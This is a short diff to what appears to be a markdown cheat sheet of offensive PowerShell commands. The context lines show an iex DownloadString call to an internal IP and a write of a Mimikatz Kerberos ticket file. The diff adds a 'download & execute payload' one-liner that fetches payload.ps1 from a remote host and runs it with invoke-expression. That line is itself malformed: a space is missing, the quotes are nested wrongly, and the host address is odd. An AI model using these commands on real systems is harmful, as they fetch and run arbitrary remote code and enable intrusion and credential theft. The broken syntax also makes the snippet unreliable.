@@ -65,3 +65,7 @@ $OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://10.8.0
 [System.IO.File]::WriteAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\zps.kirbi", [System.Convert]::FromBase64String("do"))
 [System.Text.Encoding]::unicode.GetString([System.Convert]::FromBase64String(""))
 ```
+### Download & execute powershell payload one liner
+```
+cmd.exe /c powershell -c '$c=new-objectsystem.net.WebClient;$x=$c.downloadstring('http://x192.168.1.1/payload.ps1');invoke-expression $x'
+```
